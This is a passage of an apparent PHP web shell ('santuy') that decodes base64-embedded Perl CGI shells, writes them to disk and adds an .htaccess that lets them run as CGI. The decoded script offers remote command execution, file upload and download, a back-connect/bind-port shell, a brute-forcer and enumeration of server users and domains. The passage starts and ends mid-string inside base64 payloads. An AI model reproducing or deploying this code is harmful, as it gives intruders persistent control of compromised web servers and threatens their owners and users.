JcmV0dXJuICRzaXplLiIgS0IiOw0KCQl9DQoJCWVsc2UgDQoJCXsNCgkJCSRzaXplID0gc3ByaW50ZigiJS4yZiIsJHNpemUgLyAxMDI0IC8gMTAyNCk7DQoJCQlyZXR1cm4gJHNpemUuIiBNQiI7DQoJCX0NCgl9DQp9DQpzdWIgdHJpbSgkKQ0Kew0KCW15ICRzdHJpbmcgPSBzaGlmdDsNCgkkc3RyaW5nID1+IHMvXlxzKy8vOw0KCSRzdHJpbmcgPX4gcy9ccyskLy87DQoJcmV0dXJuICRzdHJpbmc7DQp9DQpzdWIgQWRkU2xhc2hlcygkKQ0Kew0KCW15ICRzdHJpbmcgPSBzaGlmdDsNCgkkc3RyaW5nPX4gcy9cXC9cXFxcL2c7DQoJcmV0dXJuICRzdHJpbmc7DQp9DQpzdWIgTGlzdERpcg0Kew0KCW15ICRwYXRoID0gJEN1cnJlbnREaXIuJFBhdGhTZXA7DQoJJHBhdGg9fiBzL1xcXFwvXFwvZzsNCglteSAkcmVzdWx0ID0gIjxmb3JtIG5hbWU9J2YnIGFjdGlvbj0nJFNjcmlwdExvY2F0aW9uJz48c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPlBhdGg6IFsgIi4mQWRkTGlua0RpcigiZ3VpIikuIiBdIDwvc3Bhbj48aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0nZCcgc2l6ZT0nNDAnIHZhbHVlPSckQ3VycmVudERpcicgLz48aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdhJyB2YWx1ZT0nZ3VpJz48aW5wdXQgY2xhc3M9J3N1Ym1pdCcgdHlwZT0nc3VibWl0JyB2YWx1ZT0nQ2hhbmdlJz48L2Zvcm0+IjsNCglpZigtZCAkcGF0aCkNCgl7DQoJCW15IEBmbmFtZSA9ICgpOw0KCQlteSBAZG5hbWUgPSAoKTsNCgkJaWYob3BlbmRpcihESVIsJHBhdGgpKQ0KCQl7DQoJCQl3aGlsZSgkZmlsZSA9IHJlYWRkaXIoRElSKSkNCgkJCXsNCgkJCQkkZj0kcGF0aC4kZmlsZTsNCgkJCQlpZigtZCAkZikNCgkJCQl7DQoJCQkJCXB1c2goQGRuYW1lLCRmaWxlKTsNCgkJCQl9DQoJCQkJZWxzZQ0KCQkJCXsNCgkJCQkJcHVzaChAZm5hbWUsJGZpbGUpOw0KCQkJCX0NCgkJCX0NCgkJCWNsb3NlZGlyKERJUik7DQoJCX0NCgkJQGZuYW1lID0gc29ydCB7IGxjKCRhKSBjbXAgbGMoJGIpIH0gQGZuYW1lOw0KCQlAZG5hbWUgPSBzb3J0IHsgbGMoJGEpIGNtcCBsYygkYikgfSBAZG5hbWU7DQoJCSRyZXN1bHQgLj0gIjxkaXY+PHRhYmxlIHdpZHRoPSc5MCUnIGNsYXNzPSdsaXN0ZGlyJz4NCg0KCQk8dHIgc3R5bGU9J2JhY2tncm91bmQtY29sb3I6ICMzZTNlM2UnPjx0aD5GaWxlIE5hbWU8L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjEwMHB4Oyc+RmlsZSBTaXplPC90aD4NCgkJPHRoIHN0eWxlPSd3aWR0aDoxNTBweDsnPk93bmVyPC90aD4NCgkJPHRoIHN0eWxlPSd3aWR0aDoxMDBweDsnPlBlcm1pc3Npb248L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+TGFzdCBNb2RpZmllZDwvdGg+DQoJCTx0aCBzdHlsZT0nd2lkdGg6MjYwcHg7Jz5BY3Rpb248L3RoPjwvdHI+IjsNCgkJbXkgJHN0eWxlPSJsaW5lIjsNCgkJbXkgJGk9MDsNCgkJZm9yZWFjaCBteSAkZCAoQGRuYW1lKQ0KCQl7DQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGQgPSAmdHJpbSgkZCk7DQoJCQkkZGlybmFtZT0kZDsNCgkJCWlmKCRkIGVxICIuLiIpIA0KCQkJew0KCQkJCSRkID0gJlBhcmVudEZvbGRlcigkcGF0aCk7DQoJCQl9DQoJCQllbHNpZigkZCBlcSAiLiIpIA0KCQkJew0KCQkJCSRkID0gJHBhdGg7DQoJCQl9DQoJCQllbHNlIA0KCQkJew0KCQkJCSRkID0gJHBhdGguJGQ7DQoJCQl9DQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+DQoNCgkJCTx0ZCBpZD0nRmlsZV8kaScgc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz48YSAgaHJlZj0nP2E9Z3VpJmQ9Ii4kZC4iJz5bICIuJGRpcm5hbWUuIiBdPC9hPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD5ESVI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZU93bmVyKCRkKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIGlkPSdGaWxlUGVybXNfJGknIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnIG9uZGJsY2xpY2s9XCJybV9jaG1vZF9mb3JtKHRoaXMsIi4kaS4iLCciLiZGaWxlUGVybXMoJGQpLiInLCciLiRkaXJuYW1lLiInKVwiID48c3BhbiBvbmNsaWNrPVwiY2htb2RfZm9ybSgiLiRpLiIsJyIuJGRpcm5hbWUuIicpXCIgPiIuJkZpbGVQZXJtcygkZCkuIjwvc3Bhbj48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZCkuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz48YSBocmVmPSdqYXZhc2NyaXB0OnJldHVybiBmYWxzZTsnIG9uY2xpY2s9XCJyZW5hbWVfZm9ybSgkaSwnJGRpcm5hbWUnLCciLiZBZGRTbGFzaGVzKCZBZGRTbGFzaGVzKCRkKSkuIicpXCI+UmVuYW1lPC9hPiAgfCA8YSBvbmNsaWNrPVwiaWYoIWNvbmZpcm0oJ1JlbW92ZSBkaXI6ICRkaXJuYW1lID8nKSkgeyByZXR1cm4gZmFsc2U7fVwiIGhyZWY9Jz9hPWd1aSZkPSRwYXRoJnJlbW92ZT0kZGlybmFtZSc+UmVtb3ZlPC9hPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsNCgkJCSRpKys7DQoJCX0NCgkJZm9yZWFjaCBteSAkZiAoQGZuYW1lKQ0KCQl7DQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGZpbGU9JGY7DQoJCQkkZiA9ICRwYXRoLiRmOw0KCQkJJHZpZXcgPSAiP2Rpcj0iLiRwYXRoLiImdmlldz0iLiRmOw0KCQkJJHJlc3VsdCAuPSAiPHRyIGNsYXNzPSckc3R5bGUnPjx0ZCBpZD0nRmlsZV8kaScgc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsnPjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0iLiRwYXRoLiImYz1lZGl0JTIwIi4kZmlsZS4iJz4iLiRmaWxlLiI8L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPiIuJlBhcnNlRmlsZVNpemUoJkZpbGVTaXplKCRmKSkuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlT3duZXIoJGYpLiI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgaWQ9J0ZpbGVQZXJtc18kaScgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOycgb25kYmxjbGljaz1cInJtX2NobW9kX2Zvcm0odGhpcywiLiRpLiIsJyIuJkZpbGVQZXJtcygkZikuIicsJyIuJGZpbGUuIicpXCIgPjxzcGFuIG9uY2xpY2s9XCJjaG1vZF9mb3JtKCRpLCckZmlsZScpXCIgPiIuJkZpbGVQZXJtcygkZikuIjwvc3Bhbj48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZikuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz48YSBocmVmPSc/YT1jb21tYW5kJmQ9Ii4kcGF0aC4iJmM9ZWRpdCUyMCIuJGZpbGUuIic+RWRpdDwvYT4gfCA8YSBocmVmPSdqYXZhc2NyaXB0OnJldHVybiBmYWxzZTsnIG9uY2xpY2s9XCJyZW5hbWVfZm9ybSgkaSwnJGZpbGUnLCdmJylcIj5SZW5hbWU8L2E+IHwgPGEgaHJlZj0nP2E9ZG93bmxvYWQmbz1nbyZmPSIuJGYuIic+RG93bmxvYWQ8L2E+IHwgPGEgb25jbGljaz1cImlmKCFjb25maXJtKCdSZW1vdmUgZmlsZTogJGZpbGUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9JHBhdGgmcmVtb3ZlPSRmaWxlJz5SZW1vdmU8L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPC90cj4iOw0KCQkJJGkrKzsNCgkJfQ0KCQkkcmVzdWx0IC49ICI8L3RhYmxlPjwvZGl2PiI7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUcnkgdG8gVmlldyBMaXN0IFVzZXINCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBWaWV3RG9tYWluVXNlcg0Kew0KCW9wZW4gKGRvbWFpbnMsICcvZXRjL25hbWVkLmNvbmYnKSBvciAkZXJyPTE7DQoJbXkgQGNuenMgPSA8ZG9tYWlucz47DQoJY2xvc2UgZDBtYWluczsNCglteSAkc3R5bGU9ImxpbmUiOw0KCW15ICRyZXN1bHQ9IjxoNT48Zm9udCBzdHlsZT0nZm9udDogMTVwdCBWZXJkYW5hO2NvbG9yOiAjZmY5OTAwOyc+SG9hbmcgU2EgLSBUcnVvbmcgU2E8L2ZvbnQ+PC9oNT4iOw0KCWlmICgkZXJyKQ0KCXsNCgkJJHJlc3VsdCAuPSAgKCc8cD5DMHVsZG5cJ3QgQnlwYXNzIGl0ICwgU29ycnk8L3A+Jyk7DQoJCXJldHVybiAkcmVzdWx0Ow0KCX1lbHNlDQoJew0KCQkkcmVzdWx0IC49ICc8dGFibGU+PHRyPjx0aD5Eb21haW5zPC90aD4gPHRoPlVzZXI8L3RoPjwvdHI+JzsNCgl9DQoJZm9yZWFjaCBteSAkb25lIChAY256cykNCgl7DQoJCWlmKCRvbmUgPX4gbS8uKj96b25lICIoLio/KSIgey8pDQoJCXsJDQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGZpbGVuYW1lPSAiL2V0Yy92YWxpYXNlcy8iLiRvbmU7DQoJCQkkb3duZXIgPSBnZXRwd3VpZCgoc3RhdCgkZmlsZW5hbWUpKVs0XSk7DQoJCQkkcmVzdWx0IC49ICc8dHIgY2xhc3M9IiRzdHlsZSIgd2lkdGg9NTAlPjx0ZD4nLiRvbmUuJyA8L3RkPjx0ZD4gJy4kb3duZXIuJzwvdGQ+PC90cj4nOw0KCQl9DQoJfQ0KCSRyZXN1bHQgLj0gJzwvdGFibGU+JzsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVmlldyBMb2cNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBWaWV3TG9nDQp7DQoJaWYoJFdpbk5UKQ0KCXsNCgkJcmV0dXJuICI8aDI+PGZvbnQgc3R5bGU9J2ZvbnQ6IDIwcHQgVmVyZGFuYTtjb2xvcjogI2ZmOTkwMDsnPkRvbid0IHJ1biBvbiBXaW5kb3dzPC9mb250PjwvaDI+IjsNCgl9DQoJbXkgJHJlc3VsdD0iPHRhYmxlPjx0cj48dGg+UGF0aCBMb2c8L3RoPjx0aD5TdWJtaXQ8L3RoPjwvdHI+IjsNCglteSBAcGF0aGxvZz0oDQoJCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvZXJyb3JfbG9nJywNCgkJCQknL3Zhci9sb2cvaHR0cGQvZXJyb3JfbG9nJywNCgkJCQknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9hY2Nlc3NfbG9nJw0KCQkJCSk7DQoJbXkgJGk9MDsNCglteSAkcGVybXM7DQoJbXkgJHNsOw0KCWZvcmVhY2ggbXkgJGxvZyAoQHBhdGhsb2cpDQoJew0KCQlpZigtdyAkbG9nKQ0KCQl7DQoJCQkkcGVybXM9Ik9LIjsNCgkJfWVsc2UNCgkJew0KCQkJY2hvcCgkc2wgPSBgbG4gLXMgJGxvZyBlcnJvcl9sb2dfJGlgKTsNCgkJCWlmKCZ0cmltKCRscykgZXEgIiIpDQoJCQl7DQoJCQkJaWYoLXIgJGxzKQ0KCQkJCXsNCgkJCQkJJHBlcm1zPSJPSyI7DQoJCQkJCSRsb2c9ImVycm9yX2xvZ18iLiRpOw0KCQkJCX0NCgkJCX1lbHNlDQoJCQl7DQoJCQkJJHBlcm1zPSI8Zm9udCBzdHlsZT0nY29sb3I6IHJlZDsnPkNhbmNlbDxmb250PiI7DQoJCQl9DQoJCX0NCgkJJHJlc3VsdCAuPTw8RU5EOw0KCQk8dHI+DQoNCgkJCTxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPg0KCQkJPHRkPjxpbnB1dCB0eXBlPSJ0ZXh0IiBvbmtleXVwPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9nXyRpJykudmFsdWU9J2xlc3MgJyArIHRoaXMudmFsdWU7IiB2YWx1ZT0iJGxvZyIgc2l6ZT0nNTAnLz48L3RkPg0KCQkJPHRkPjxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJUcnkiIC8+PC90ZD4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPSJsb2dfJGkiIG5hbWU9ImMiIHZhbHVlPSJsZXNzICRsb2ciLz4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJjb21tYW5kIiAvPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIiAvPg0KCQkJPC9mb3JtPg0KCQkJPHRkPiRwZXJtczwvdGQ+DQoNCgkJPC90cj4NCkVORA0KCQkkaSsrOw0KCX0NCgkkcmVzdWx0IC49IjwvdGFibGU+IjsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQomUmVhZFBhcnNlOw0KJkdldENvb2tpZXM7DQoNCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307DQokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307DQokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9Ow0KJFJ1bkNvbW1hbmQgPSAkaW57J2MnfTsNCiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsNCiRPcHRpb25zID0gJGlueydvJ307DQokQWN0aW9uID0gJGlueydhJ307DQoNCiRBY3Rpb24gPSAiY29tbWFuZCIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQNCg0KIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3aGljaCB0aGUgY29tbWFuZHMgd2lsbCBiZSBleGVjdXRlZA0KJEN1cnJlbnREaXIgPSAmdHJpbSgkaW57J2QnfSk7DQojIG1hYyBkaW5oIHh1YXQgdGhvbmcgdGluIG5ldSBrbyBjbyBsZW5oIG5hbyENCiRSdW5Db21tYW5kPSAkV2luTlQ/ImRpciI6ImRpciAtbGlhIiBpZigkUnVuQ29tbWFuZCBlcSAiIik7DQpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7DQoNCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRQYXNzd29yZDsNCg0KaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pIAkJIyB1c2VyIG5lZWRzL2hhcyB0byBsb2dpbg0Kew0KCSZQZXJmb3JtTG9naW47DQp9ZWxzaWYoJEFjdGlvbiBlcSAiZ3VpIikgIyBHVUkgZGlyZWN0b3J5DQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglpZighJFdpbk5UKQ0KCXsNCgkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOw0KCQlpZighKCRjaG1vZCBlcSAwKSkNCgkJew0KCQkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOw0KCQkJJGZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgkJCWNob3AoJHJlc3VsdD0gYGNobW9kICRjaG1vZCAiJGZpbGUiYCk7DQoJCQlpZigmdHJpbSgkcmVzdWx0KSBlcSAiIikNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJCQl9ZWxzZQ0KCQkJew0KCQkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJCQl9DQoJCX0NCgl9DQoJJHJlbmFtZT0kaW57J3JlbmFtZSd9Ow0KCWlmKCEkcmVuYW1lIGVxICIiKQ0KCXsNCgkJaWYocmVuYW1lKCRUcmFuc2ZlckZpbGUsJHJlbmFtZSkpDQoJCXsNCgkJCXByaW50ICI8cnVuPiBEb25lISA8L3J1bj48YnI+IjsNCgkJfWVsc2UNCgkJew0KCQkJcHJpbnQgIjxydW4+IFNvcnJ5ISBZb3UgZG9udCBoYXZlIHBlcm1pc3Npb25zISA8L3J1bj48YnI+IjsNCgkJfQ0KCX0NCgkkcmVtb3ZlPSRpbnsncmVtb3ZlJ307DQoJaWYoJHJlbW92ZSBuZSAiIikNCgl7DQoJCSRybSA9ICRDdXJyZW50RGlyLiRQYXRoU2VwLiRyZW1vdmU7DQoJCWlmKC1kICRybSkNCgkJew0KCQkJJlJtRGlyKCRybSk7DQoJCX1lbHNlDQoJCXsNCgkJCWlmKHVubGluaygkcm0pKQ0KCQkJew0KCQkJCXByaW50ICI8cnVuPiBEb25lISA8L3J1bj48YnI+IjsNCgkJCX1lbHNlDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IFNvcnJ5ISBZb3UgZG9udCBoYXZlIHBlcm1pc3Npb25zISA8L3J1bj48YnI+IjsNCgkJCX0JCQkNCgkJfQ0KCX0NCglwcmludCAmTGlzdERpcjsNCg0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiY29tbWFuZCIpCQkJCSAJIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQNCnsNCgkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJcHJpbnQgJkV4ZWN1dGVDb21tYW5kOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAic2F2ZSIpCQkJCSAJIyB1c2VyIHdhbnRzIHRvIHNhdmUgYSBmaWxlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglpZigmU2F2ZUZpbGUoJGlueydkYXRhJ30sJGlueydmaWxlJ30pKQ0KCXsNCgkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCX1lbHNlDQoJew0KCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCX0NCglwcmludCAmTGlzdERpcjsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpIAkJCQkJIyB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KDQoJcHJpbnQgJlVwbG9hZEZpbGU7DQp9DQplbHNpZigkQWN0aW9uIGVxICJiYWNrYmluZCIpIAkJCQkjIHVzZXIgd2FudHMgdG8gYmFjayBjb25uZWN0IG9yIGJpbmQgcG9ydA0Kew0KCSZQcmludFBhZ2VIZWFkZXIoImNsaWVudHBvcnQiKTsNCglwcmludCAmQmFja0JpbmQ7DQp9DQplbHNpZigkQWN0aW9uIGVxICJicnV0ZWZvcmNlciIpIAkJCSMgdXNlciB3YW50cyB0byBicnV0ZSBmb3JjZQ0Kew0KCSZQcmludFBhZ2VIZWFkZXI7DQoJcHJpbnQgJkJydXRlRm9yY2VyOw0KfWVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgCQkJCSMgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUNCnsNCglwcmludCAmRG93bmxvYWRGaWxlOw0KfWVsc2lmKCRBY3Rpb24gZXEgImNoZWNrbG9nIikgCQkJCSMgdXNlciB3YW50cyB0byB2aWV3IGxvZyBmaWxlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmVmlld0xvZzsNCg0KfWVsc2lmKCRBY3Rpb24gZXEgImRvbWFpbnN1c2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbGlzdCB1c2VyL2RvbWFpbg0Kew0KCSZQcmludFBhZ2VIZWFkZXI7DQoJcHJpbnQgJlZpZXdEb21haW5Vc2VyOw0KfWVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpIAkJCQkjIHVzZXIgd2FudHMgdG8gbG9nb3V0DQp7DQoJJlBlcmZvcm1Mb2dvdXQ7DQp9DQomUHJpbnRQYWdlRm9vdGVyOw==";
      $cgi = fopen($file_cgi, "w");
      fwrite($cgi, base64_decode($cgi_script));
      fwrite($htcgi, $isi_htcgi);
      chmod($file_cgi, 0755);
            chmod($memeg, 0755);
      echo "<br><center>Done ... <a href='santuy_cgi/cgi.santuy' target='_blank'>Klik Here</a>";
      echo "<br>";
      } elseif($_GET['do'] == 'cgi2') {
      $cgi_dir = mkdir('santuy_cgi', 0755);
            chdir('santuy_cgi');
      $file_cgi = "cgi2.santuy";
            $memeg = ".htaccess";
      $isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .santuy \n AddHandler cgi-script .santuy \n AddHandler cgi-script .santuy";
      $htcgi = fopen(".htaccess", "w");
      $cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQojIENvcHlyaWdodCAoQykgMjAwMSBSb2hpdGFiIEJhdHJhDQojIFJlY29kZWQgQnkgQ29uN2V4dA0KIyBUaGFua3MgVG8gOiAweDE5OTkgLSBYYWkgU3luZGljYXRlIFRlYW0gLSBBbmQgWW91DQogDQokV2luTlQgPSAwOw0KJE5UQ21kU2VwID0gIiYiOw0KJFVuaXhDbWRTZXAgPSAiOyI7DQokQ29tbWFuZFRpbWVvdXREdXJhdGlvbiA9IDEwOw0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsNCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDogInB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0Kc3ViIFJlYWRQYXJzZQ0Kew0KICAgIGxvY2FsICgqaW4pID0gQF8gaWYgQF87DQogICAgbG9jYWwgKCRpLCAkbG9jLCAka2V5LCAkdmFsKTsNCiAgIA0KICAgICRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KIA0KICAgIGlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpDQogICAgew0KICAgICAgICAkaW4gPSAkRU5WeydRVUVSWV9TVFJJTkcnfTsNCiAgICB9DQogICAgZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpDQogICAgew0KICAgICAgICBiaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7DQogICAgICAgIHJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQogICAgfQ0KIA0KICAgICMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCiAgICBpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykNCiAgICB7DQogICAgICAgICRCb3VuZGFyeSA9ICctLScuJDE7ICMgcGxlYXNlIHJlZmVyIHRvIFJGQzE4NjcNCiAgICAgICAgQGxpc3QgPSBzcGxpdCgvJEJvdW5kYXJ5LywgJGluKTsNCiAgICAgICAgJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCiAgICAgICAgJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0KICAgICAgICAkSGVhZGVyID0gJGA7DQogICAgICAgICRCb2R5ID0gJCc7DQogICAgICAgICRCb2R5ID1+IHMvXHJcbiQvLzsgIyB0aGUgbGFzdCBcclxuIHdhcyBwdXQgaW4gYnkgTmV0c2NhcGUNCiAgICAgICAgJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7DQogICAgICAgICRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsNCiAgICAgICAgJGlueydmJ30gPSAkMTsNCiAgICAgICAgJGlueydmJ30gPX4gcy9cIi8vZzsNCiAgICAgICAgJGlueydmJ30gPX4gcy9ccy8vZzsNCiANCiAgICAgICAgIyBwYXJzZSB0cmFpbGVyDQogICAgICAgIGZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspDQogICAgICAgIHsNCiAgICAgICAgICAgICRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KICAgICAgICAgICAgJGxpc3RbJGldID1+IC9cIihcdyspXCIvOw0KICAgICAgICAgICAgJGtleSA9ICQxOw0KICAgICAgICAgICAgJHZhbCA9ICQnOw0KICAgICAgICAgICAgJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCiAgICAgICAgICAgICR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQogICAgICAgICAgICAkaW57JGtleX0gPSAkdmFsOw0KICAgICAgICB9DQogICAgfQ0KICAgIGVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQ0KICAgIHsNCiAgICAgICAgQGluID0gc3BsaXQoLyYvLCAkaW4pOw0KICAgICAgICBmb3JlYWNoICRpICgwIC4uICQjaW4pDQogICAgICAgIHsNCiAgICAgICAgICAgICRpblskaV0gPX4gcy9cKy8gL2c7DQogICAgICAgICAgICAoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOw0KICAgICAgICAgICAgJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCiAgICAgICAgICAgICR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQogICAgICAgICAgICAkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsNCiAgICAgICAgICAgICRpbnska2V5fSAuPS